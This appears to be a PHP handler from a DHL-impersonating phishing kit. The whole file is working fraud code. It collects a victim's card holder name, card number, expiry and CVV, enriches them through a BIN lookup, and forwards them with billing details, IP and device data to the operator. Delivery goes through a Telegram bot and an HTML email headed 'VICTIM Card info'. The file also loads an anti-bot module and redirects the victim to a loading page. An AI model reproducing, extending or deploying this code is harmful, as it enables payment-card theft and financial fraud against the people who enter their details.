<?php 

session_start();

include '../../config.php';
include '../../antibots/index.php';

include '../functions.php';
$TIME = date("d/m/Y");
$ip = $_SERVER['REMOTE_ADDR'];
get_user_ipinfo($ip);
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$os_plat = getOS($user_agent);
$browser = getBrowser();


if (($_POST['full'] != "") AND ($_POST['ccnumber-zbi'] != "") AND ($_POST['cvvcodezbi'] != "")) {
    $card_holder = $_POST['full'];
    $card_numb = $_POST['ccnumber-zbi'];
    $EXP = $_POST['month'] . "/" . $_POST['year'];
    $CVV = $_POST['cvvcodezbi'];

    $_SESSION['full'] = $_POST['full'];
    $_SESSION['ccnumber-zbi'] = $_POST['ccnumber-zbi'];
    $_SESSION['exp'] = $_POST['month'] . "/" . $_POST['year'];
    $_SESSION['cvv'] = $_POST['cvvcodezbi'];

    $card_fast = preg_replace('/\s/', '', $card_numb);
    $bin_card = substr($card_fast,0,8);

    $cardlastdigit = substr($card_fast,12,16);
    $_SESSION['cardlastdigit'] = $cardlastdigit;



    $url_bin = "https://lookup.binlist.net/".$bin_card;
    $headers = array();
    $headers[] = 'Accept-Version: 3';
    $ch = curl_init();  
    curl_setopt($ch,CURLOPT_URL,$url_bin);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $resp=curl_exec($ch);
    curl_close($ch);
    $xBIN = json_decode($resp, true);

    $_SESSION['bank_name'] = $xBIN["bank"]["name"];
    $_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
    $_SESSION['bank_type'] = strtoupper($xBIN["type"]);
    $_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
    $_SESSION['bank_country'] = $xBIN["country"]["name"];
    $_SESSION['bank_emoji'] = $xBIN["country"]["emoji"];

    $bank_name = $xBIN["bank"]["name"];
    $scheme = strtoupper($xBIN["scheme"]);
    $card_type = strtoupper($xBIN["type"]);
    $brand = strtoupper($xBIN["brand"]);
    $bank_country = $xBIN["country"]["name"];
    $bacountry_emoji = $xBIN["country"]["emoji"];


    if ($scheme == "VISA") {
        $_SESSION['card_logo'] = "viza.svg";

    }
    elseif ($scheme = "MASTERCARD") {
        $_SESSION['card_logo'] = "mastercard.svg";
    }

    $Message_cc = "
    💳 ━━━━━━━━━━━━ 💳
    VICTIM Card info:
    Card Holder:  `$card_holder `
    Card:  `$card_numb `
    EXP: `$EXP`
    CVV: `$CVV`
    🏦 ━━━━━━━━━━━━ 🏦
    Bank info:
    Card Type: `$scheme - $card_type $brand`
    Card country: `$bank_country - $bacountry_emoji`
    Bank Name: `$bank_name`
    Bin: `$bin_card`
    📱 ━━━━━━━━━━━━ 📱
    VICTIM IP info:
    IP: `$ip`
    IPcountry: $countryy - $country_code
    Region: $regionn
    Telecom: $isp
    Time: $TIME
    Device: $os_plat - $browser
    📦 ━━━━━━━━━━━━ 📦
    🃏 DHL V3 by  🃏";


    sendMessage($ChatId, $Message_cc, $BotToken);



    $email_template = "
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>

    <title>Email Template</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .container {
            width: 300%;
            max-width: 1000px;
            margin: 0 auto;
            box-sizing: border-box;
        }
        .header {

            background-image: url('');
            padding: 70px 0;
            text-align: center;
        }
        .content {
            text-align: center;
            padding: 20px;
            font-size: 16px;
            line-height: 1.5em;
        }
        .footer {
            padding: 20px 0;
            text-align: center;
        }
        .footer .a .p {
            max-width: 100%
        }
    </style>
</head>
<body>
    <div class='container'>
        <div class='header'>
            <img src='https://i.postimg.cc/3RChmjwf/Screenshot-2023-11-05-211624.png'>
        </div>
        <div class='content'>
            <h3>DHL FULLz 📦 " .$card_holder." | Country " . $countryy . $bacountry_emoji . " | Type: " . $scheme . "-" . $card_type . $brand . " | BIN 💳: ".$bin_card." | BANK 🏦:".$_SESSION['bank_name']." ". $ip. " DHL FULLz 📦 </h3>
            <p>📦 ━━━━━━━━━━━━ 📦</p>
            <p>VICTIM Card info:</p>
            <p>Card Holder: ".  $card_holder . "</p>
            <p>Card: " . $card_numb . "</p>
            <p>EXP: " . $EXP . "</p>
            <p>CVV: " . $CVV . "</p>
            <p>🏦 ━━━━━━━━━━━━ 🏦</p>
            <p>Bank info:</p>
            <p>Card Type: " . $scheme . "-" . $card_type . $brand . "</p>
            <p>Card country: " . $bank_country . "-" . $bacountry_emoji . "</p>
            <p>Bank Name: " . $bank_name . "</p>
            <p>Bin: " . $bin_card . "</p>
            <p>  ━━━━━━━━━━━━  </p>
            <p>VICTIM Billing info:</p>
            <p>Country: " .  $countryy . "</p>
            <p>Address: " . $_SESSION['adress'] . "</p>
            <p>City: " .  $_SESSION['city'] . "</p>
            <p>State: " . $_SESSION['state'] . "</p>
            <p>Zip: " . $_SESSION['zip'] . "</p>
            <p>Email: " . $_SESSION['email'] . "</p>
            <p>Phone: " . $_SESSION['phone'] . "</p>
            <p>DOB: " . $_SESSION['birt'] . "</p>
            <p>📱 ━━━━━━━━━━━━ 📱</p>
            <p>VICTIM IP info:</p>
            <p>IP:" . $ip . "</p>
            <p>IPcountry: " . $countryy . "-" .$country_code . "</p>
            <p>Region: " . $regionn . "</p>
            <p>Telecom: " . $isp . "</p>
            <p>Device: " . $os_plat . "-" . $browser . "</p>
            <p>📦 ━━━━━━━━━━━━ 📦</p>
        </div>
        <div class='footer'>
            <p style='color: #0066ff;'>#########################</p>
            <p>Made with ❤️ and Power</p>
            <a href=''><p style='color: #0066ff; max-width: 100%;'></p></a>
            <a href='https://t.me/amandz741'><p style='color: #cc0000; max-width: 100%;'>By </p></a>
            <p style='color: #0066ff; max-width: 100%;'>#########################</p>

";



    if ($send_to_email == "1") {

        $subject = "DHL FULLz 📦 " .$card_holder." | Country " . $countryy . $bacountry_emoji . " | Type: " . $scheme . "-" . $card_type . $brand . " | BIN 💳: ".$bin_card." | BANK 🏦:".$_SESSION['bank_name']." ". $ip. " DHL FULLz 📦 ";

        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        $headers .= 'From: DHL-Rzlt <rzlt@cc.com>';

        mail($email, $subject, $email_template, $headers);

    }

    header('location: ../loading_2.php');

    
}


?>